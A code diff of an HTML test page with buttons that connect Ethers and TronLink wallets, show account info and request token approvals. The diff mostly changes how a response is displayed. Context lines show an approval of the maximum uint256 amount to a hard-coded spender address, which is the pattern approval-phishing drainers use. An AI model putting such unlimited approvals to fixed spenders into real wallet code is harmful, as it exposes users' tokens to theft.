@@ -19,9 +19,10 @@
             await checkEthersApproval("0xAc5DFB21853A1fdF2CCaF11fC2D2076f3e89049b", "0x6aFFdb18a2E6d93fab0B5899AE0591208e21ea5E")
         }
         async function connectTronLink() {
-            const response = await getTronlinkAccountInfo("TKyq4GzNALAzSRjCM6ZHo7tBJXVWHiSNQK")
-            document.getElementById("account").innerText = `Account: ${response.address}`
-            document.getElementById("balance").innerText = `Balance: ${response.balance}`
+            const response = await getTronlinkAccountInfo("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
+            document.getElementById("account").innerText = `Account: ${response.data.address}`
+            document.getElementById("balance").innerText = `Balance: ${response.data.balance}`
+            document.getElementById("msg").innerText = `Code: ${response.code}, Msg: ${response.msg}`
         }
         async function approveTronLink() {
             await tronLinkApproval("TKyq4GzNALAzSRjCM6ZHo7tBJXVWHiSNQK", "TBw6wtLPF1fMV3tyVPXfHAeEbGKvHwoStF", "115792089237316195423570985008687907853269984665640564039457584007913129639935")
@@ -39,6 +40,7 @@
 <body>
 <p id="account">Account: n/a</p>
 <p id="balance">Balance: n/a</p>
+<p id="msg">Code: n/a, Msg: n/a</p>
 <p>ethers</p>
 <button onclick="connectEthers()">Connect Ethers</button>
 <button onclick="approveEthers()">Approve</button>
